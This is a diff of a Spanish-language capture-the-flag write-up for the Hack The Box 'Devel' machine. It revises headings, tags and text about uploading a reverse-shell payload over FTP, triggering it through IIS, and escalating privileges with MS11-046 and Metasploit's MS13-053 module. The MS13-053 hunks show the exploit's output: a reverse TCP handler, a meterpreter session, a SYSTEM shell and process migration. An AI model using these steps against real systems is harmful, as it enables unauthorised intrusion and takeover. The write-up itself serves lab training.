@@ -14,20 +14,33 @@ categories:
 tags:
   - Windows
   - FTP Enumeration
+  - Abusing FTP Service
   - Local File Inclusion (LFI)
   - Reverse Shell
-  - IIS Exploitation
+  - Abusing IIS Service
   - Local Privilege Escalation (LPE)
   - LPE - MS11-046
+  - LPE - MS13-053
   - OSCP Style
+  - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-devel/devel_logo.png)
 
-Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar un Payload que contendrá una Shell que se activará en el puerto HTTP que corre el servicio IIS y después escalaremos privilegios usando el Exploit MS11-046.
+Una máquina bastante sencilla, en la cual usaremos el **servicio FTP** para cargar un **Payload** que contendrá una **Reverse Shell** que se activará en el **servicio HTTP** que corre el **servicio IIS** y después escalaremos privilegios usando el **Exploit MS11-046**.
 
 Herramientas utilizadas:
 * *nmap*
+* *ftp*
+* *wappalizer*
 * *msfvenom*
+* *aspx_cmd.aspx*
+* *nc*
+* *rlwrap*
+* *i686-w64-mingw32-gcc*
+* *impacket*
+* *msfconsole*
+* *meterpreter*
+* *nc.exe*
 
 
 <br>
@@ -44,15 +57,15 @@ Herramientas utilizadas:
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
-				<li><a href="FTP2">Realizando Pruebas en Servicio FTP</a></li>
+				<li><a href="#FTP2">Realizando Pruebas en Servicio FTP</a></li>
 				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#IIS">Investigando Servicio IIS</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Payload">Configurando un Payload con Reverse Shell</a></li>
+				<li><a href="#Payload">Configurando un Payload de Reverse Shell</a></li>
 				<ul>
-                                        <li><a href="#Msfvenom">Configurando el Payload con Msfvenom</a></li>
+                                        <li><a href="#Msfvenom">Configurando el Payload de Reverse Shell con Msfvenom</a></li>
 					<li><a href="#Netcat">Utilizando una cmd.aspx de Kali</a></li>
                                 </ul>
 			</ul>
@@ -64,16 +77,12 @@ Herramientas utilizadas:
                                 	<li><a href="#PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a></li>
                         	</ul>
 			</ul>
-		<li><a href="#Post">Post Explotación</a></li>
+		<li><a href="#Otras">Otras Formas</a></li>
 			<ul>
 				<li><a href="#Exploit2">Ganando Acceso y Escalando Privilegios con Metasploit</a></li>
 				<ul>
 					<li><a href="#Suggester">Usando Modulo local_exploit_suggester</a></li>
-					<li><a href="#MS13">Usando Exploit ms13_053_schlamperei</a></li>
-				</ul>
-				<li><a href="#Exploit3"></a></li>
-				<ul>
-					<li><a href="#"></a></li>
+					<li><a href="#MS13">Usando Exploit MS13-053 schlamperei</a></li>
 				</ul>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
@@ -368,7 +377,7 @@ Entonces, la **extensión ASP** podría decirse que es la página web y la **ext
 <br>
 
 
-<h2 id="Payload">Configurando un Payload con Reverse Shell</h2>
+<h2 id="Payload">Configurando un Payload de Reverse Shell</h2>
 
 Para este caso, tenemos dos opciones, la primera es crear nuestra **Reverse Shell** con **Msfvenom** o la otra es ocupar un recurso con el que cuenta **Kali** que nos da una CMD que podemos usar, desde la página web. Vamos a ocupar ambos, pero empezamos creando nuestra propia **Reverse Shell**.
 
@@ -719,7 +728,7 @@ OS Configuration:          Standalone Workstation
 OS Build Type:             Multiprocessor Free
 Registered Owner:          babis
 ```
-Ok, tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Desde aquí, nos surgen al menos 2 formas de poder escalar privilegios, la primera usando un Exploit para la versión del Windows, la segunda utilizando Juicy o Rotten Potato para abusar del privilegio **SeImpersonatePrivilege**.
+Ok, tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Desde aquí, nos surgen al menos 2 formas de poder escalar privilegios, la primera usando un Exploit para la versión del Windows, la segunda utilizando Juicy o Rotten Potato para abusar del privilegio **SeImpersonatePrivilege** (esta opción queda para que la pruebes).
 
 Vamos a usar ambas y luego investigaremos como ganar acceso con **Metasploit Framework**. Pero, primero vamos a hacerlo con la primera opción y las demás, las dejamos para la sección **Otras Formas**.
 
@@ -832,7 +841,7 @@ Buscamos las flags y listo, con esto ya tenemos las flags de la máquina.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Otras Formas</h1>
+ <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
   <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
    <a href="#Indice">Volver al Índice</a>
   </button>
@@ -968,7 +977,7 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
 Obviamente no podemos usar todos los Exploits, debemos investigar cada uno para saber cual es el indicado para usar. Después de investigar, nos puede servir el **Exploit ms13_053_schlamperei**, así que vamos a usarlo.
 
 <br>
-<h3 id="MS13">Usando Exploit ms13_053_schlamperei</h3>
+<h3 id="MS13">Usando Exploit MS13-053 schlamperei</h3>
 
 * Cargamos el modulo:
 ```bash
@@ -988,7 +997,7 @@ LHOST => Tu_IP
 * Y lo ejecutamos:
 ```bash
 msf6 exploit(windows/local/ms13_053_schlamperei) > exploit
-
+.
 [*] Started reverse TCP handler on Tu_IP:4444 
 [*] Launching notepad to host the exploit...
 [+] Process 4060 launched.
@@ -998,20 +1007,20 @@ msf6 exploit(windows/local/ms13_053_schlamperei) > exploit
 [+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
 [*] Sending stage (175686 bytes) to 10.10.10.5
 [*] Meterpreter session 2 opened (Tu_IP:4444 -> 10.10.10.5:49161)
-
+.
 meterpreter > shell
 Process 1068 created.
 Channel 1 created.
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
+.
 C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
 Con esto ya hemos ganado acceso como Administador.
 
-Es posible que falle y no se genere una sesión como Administrador, pero el modulo indicara que si funciono, entonces, si entras a la máquina puedes buscar el **proceso winlogon.exe** y migrar a este para ser Administrador.
+Es posible que falle y no se genere una sesión como Administrador, pero el modulo indicara que sí funciono, entonces, si entras a la máquina puedes buscar el **proceso winlogon.exe** y migrar a este para ser Administrador.
 ```bash
 meterpreter > ps
 
@@ -1031,7 +1040,7 @@ Process List
 meterpreter > migrate 440
 ```
 
-<h2 id="Exploit3">Utilizando Rotten Potato para Escalar Privilegios</h2>
+Con esto terminamos esta máquina y como mencione antes, prueba si puedes escalar privilegios utilizando Juicy o Rotten Potato.
 
 
 <br>
